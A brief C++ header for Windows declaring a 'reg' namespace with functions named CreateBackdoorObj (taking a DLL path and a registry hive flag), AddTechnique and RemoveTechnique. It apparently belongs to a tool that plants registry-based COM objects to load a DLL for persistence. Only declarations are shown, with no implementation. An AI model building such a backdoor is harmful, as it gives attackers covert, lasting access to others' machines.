#pragma once

#include <string>
#include <Windows.h>


#define HKCU 0
#define HKCR 1


namespace reg {

	GUID CreateBackdoorObj(BYTE Type, std::wstring DllPath);
	BOOL AddTechnique(DWORD type);
	BOOL RemoveTechnique(DWORD type);

}